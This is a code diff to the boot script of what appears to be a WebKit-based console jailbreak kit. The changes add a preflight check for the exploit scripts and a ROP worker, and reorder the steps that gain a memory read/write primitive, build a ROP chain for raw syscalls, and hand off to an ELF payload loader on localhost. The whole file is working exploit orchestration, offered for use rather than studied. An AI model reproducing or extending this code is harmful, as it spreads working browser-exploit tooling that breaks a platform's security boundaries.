@@ -1,5 +1,6 @@
 import { establishPrimitive, fakeCellReleased } from "./core.js";
 import { installWindowP, pairStatus } from "./mem.js";
+import { int64 } from "./int64.js";
 
 const Q = new URLSearchParams(location.search);
 const ARMED = Q.get("go") === "1";
@@ -23,6 +24,8 @@ const logEl = document.getElementById("log");
 const menuEl = document.getElementById("menu");
 const verdictEl = document.getElementById("verdict");
 
+const nogcHard = { carrier: null, p: null, chain: null };
+
 let P = null;
 let chain = null;
 let chainDead = "";
@@ -43,58 +46,106 @@ function logLine(text) {
     logEl.scrollTop = logEl.scrollHeight;
 }
 
-function trimMemory() {
-    try {
-        logEl.textContent = logEl.textContent.slice(-2000);
-        if (typeof globalThis.gc === "function") {
-            globalThis.gc();
-            globalThis.gc();
-            globalThis.gc();
-        }
-    } catch (e) { }
-}
+async function preflight() {
+    if (typeof prepare !== "function")
+        throw new Error("main.js did not evaluate");
+    if (typeof worker_rop !== "function")
+        throw new Error("rop.js did not evaluate");
+    if (typeof SYS_GETPID === "undefined")
+        throw new Error("syscalls.js did not evaluate");
 
-async function settleMemory(ms) {
-    await new Promise(r => setTimeout(r, ms));
-    trimMemory();
-    await new Promise(r => setTimeout(r, 250));
-}
-
-function loadScript(src) {
-    return new Promise((resolve, reject) => {
-        const s = document.createElement("script");
-        s.src = src;
-        s.onload = () => resolve();
-        s.onerror = () => reject(new Error("script load failed: " + src));
-        document.head.appendChild(s);
-    });
-}
-
-function waitOffsetsReady() {
-    return new Promise((resolve, reject) => {
-        const s = document.querySelector('script[src^="../offsets/"]');
-        if (!s) return reject(new Error("offsets script missing"));
-        if (typeof OFFSET_wk_vtable_first_element !== "undefined") return resolve(s.src);
-        s.addEventListener("load", () => resolve(s.src));
-        s.addEventListener("error", () => reject(new Error("offsets 404: " + s.src)));
-    });
-}
-
-async function loadChainScripts() {
-    const B = encodeURIComponent(BUILD());
-    logLine("loading chain scripts…");
-    await loadScript("main.js?b=" + B);
-    window.offsetsReady = waitOffsetsReady();
-    await loadScript("rop.js?b=" + B);
-    await loadScript("syscalls.js?b=" + B);
     await window.offsetsReady;
-    logLine("chain scripts ready");
+    logLine("offsets ready fw=" + window.fw_str);
+
+    let verdict = "ok";
+    try {
+        const r = await fetch("rop_slave.js", { cache: "no-store" });
+        if (!r.ok) verdict = "http-" + r.status;
+    } catch (err) { verdict = "fetch-threw"; }
+    if (verdict === "ok") {
+        let w = null;
+        verdict = await new Promise(resolve => {
+            let done = false;
+            const finish = v => {
+                if (done) return;
+                done = true;
+                try { if (w) w.terminate(); } catch { }
+                resolve(v);
+            };
+            const t = setTimeout(() => finish("timeout"), 4000);
+            try {
+                w = new Worker("rop_slave.js");
+                w.onmessage = () => { clearTimeout(t); finish("ok"); };
+                w.onerror = () => { clearTimeout(t); finish("worker-error"); };
+                w.postMessage(0);
+            } catch (err) { clearTimeout(t); finish("worker-threw"); }
+        });
+    }
+    logLine("worker probe: " + verdict);
+    if (verdict !== "ok")
+        throw new Error("rop_slave.js not usable (" + verdict + ")");
+}
+
+function assertInt64Identity() {
+    if (globalThis.int64 !== int64)
+        throw new Error("int64 identity mismatch");
+}
+
+async function bootWebKit() {
+    if (globalThis.p && typeof globalThis.p.read8 === "function") {
+        logLine("primitive reused");
+        return;
+    }
+
+    stage("WebKit exploit — starting");
+    try { history.replaceState(null, ""); } catch (e) { }
+    if (typeof globalThis.gc === "function") {
+        try { globalThis.gc(); } catch (e) { }
+    }
+    await new Promise(r => setTimeout(r, 750));
+
+    const carrier = await establishPrimitive({
+        maxAttempts: MAX_ATTEMPTS,
+        onEvent(tag, detail, attempt) {
+            if (tag === "ATTEMPT-START")
+                stage("WebKit exploit — attempt " + attempt + "…");
+        }
+    });
+
+    nogcHard.carrier = carrier;
+    installWindowP(carrier, { onEvent() { } });
+    nogcHard.carrier = null;
+    if (typeof globalThis.gc === "function") {
+        try { globalThis.gc(); } catch (e) { }
+    }
+    // slopkit poops.html: idle turn before prepare()'s worker ROP stack
+    await new Promise(r => setTimeout(r, 1000));
+
+    if (!pairStatus.promoted)
+        throw new Error("pair not promoted: " + pairStatus.error);
+    logLine("primitive up released=" + fakeCellReleased()
+        + " history=" + (history.state === null));
+}
+
+async function bootPrepare() {
+    const p = globalThis.p;
+    if (!p || typeof p.read8 !== "function")
+        throw new Error("window.p missing");
+    nogcHard.p = p;
+    assertInt64Identity();
+
+    stage("prepare()");
+    logLine("prepare() enter");
+    const prepared = await prepare(p);
+    P = prepared.p;
+    chain = prepared.chain;
+    nogcHard.chain = chain;
+    logLine("prepare() ok");
 }
 
 function classify(raw) {
     const s32 = ((raw.low << 0) >> 0);
-    const failed = s32 < 0;
-    return { s32, failed };
+    return { s32, failed: s32 < 0 };
 }
 
 function errText(res) {
@@ -109,7 +160,8 @@ async function sys(num, a, b, c, d, e, f) {
     const raw = await chain.syscall(num, a, b, c, d, e, f);
     const cl = classify(raw);
     return { raw, s32: cl.s32, failed: cl.failed,
-        hex: "0x" + raw.toString(), errText: errText({ failed: cl.failed, s32: cl.s32, hex: "0x" + raw.toString() }) };
+        hex: "0x" + raw.toString(),
+        errText: errText({ failed: cl.failed, s32: cl.s32, hex: "0x" + raw.toString() }) };
 }
 
 function mem(n) {
@@ -249,68 +301,26 @@ function showMenu() {
     try { menuEl.firstChild.focus(); } catch (e) { }
 }
 
-async function bootWebKit() {
-    stage("WebKit exploit — attempt 1…");
-    try { history.replaceState(null, ""); } catch (e) { }
-    if (typeof globalThis.gc === "function") try { globalThis.gc(); } catch (e) { }
-    await new Promise(r => setTimeout(r, 500));
-
-    const carrier = await establishPrimitive({
-        maxAttempts: MAX_ATTEMPTS,
-        onEvent(tag, detail, attempt) {
-            if (tag === "ATTEMPT-START")
-                stage("WebKit exploit — attempt " + attempt + "…");
-        }
-    });
-    if (!Number.isFinite(carrier.homeVector))
-        throw new Error("bad carrier homeVector");
-
-    installWindowP(carrier, { onEvent() { } });
-    if (!pairStatus.promoted)
-        throw new Error("pair not promoted: " + pairStatus.error);
-    logLine("primitive up, released=" + fakeCellReleased());
-    await settleMemory(1200);
-}
-
-async function bootPrepare() {
-    const p = globalThis.p;
-    if (!p || typeof p.read8 !== "function")
-        throw new Error("window.p missing");
-
-    stage("prepare() — lite stack");
-    logLine("prepare() starting");
-    const prepared = await prepare(p, {
-        stackSize: 0x18000,
-        reservedStack: 0x3000
-    });
-    P = prepared.p;
-    chain = prepared.chain;
-    logLine("prepare() ok, pid syscall passed");
-    await settleMemory(1500);
-    trimMemory();
-}
-
 async function main() {
     if (!ARMED) {
-        stage("Add ?go=1 to the URL or use the index page button.");
+        stage("Add ?go=1 or use the index PAYLOAD MENU ONLY button.");
         return;
     }
 
-    document.getElementById("buildTag").textContent = "Build " + BUILD() + " (menu lite)";
-    logLine("menu-lite boot build=" + BUILD());
+    document.getElementById("buildTag").textContent = "Build " + BUILD() + " (slopkit boot)";
+    logLine("menu boot build=" + BUILD());
 
+    stage("preflight");
+    await preflight();
     await bootWebKit();
-    await loadChainScripts();
     await bootPrepare();
 
     stage("Checking elfldr on 127.0.0.1:9021…");
     if (!(await probeExistingElfldr())) {
-        stage("elfldr not found on 127.0.0.1:9021 — run full jailbreak first", "bad");
-        logLine("elfldr probe failed");
+        stage("elfldr not on 127.0.0.1:9021 — run full jailbreak first", "bad");
         return;
     }
 
-    logLine("elfldr reachable");
     stage("Payload manager ready", "ok");
     showMenu();
 }
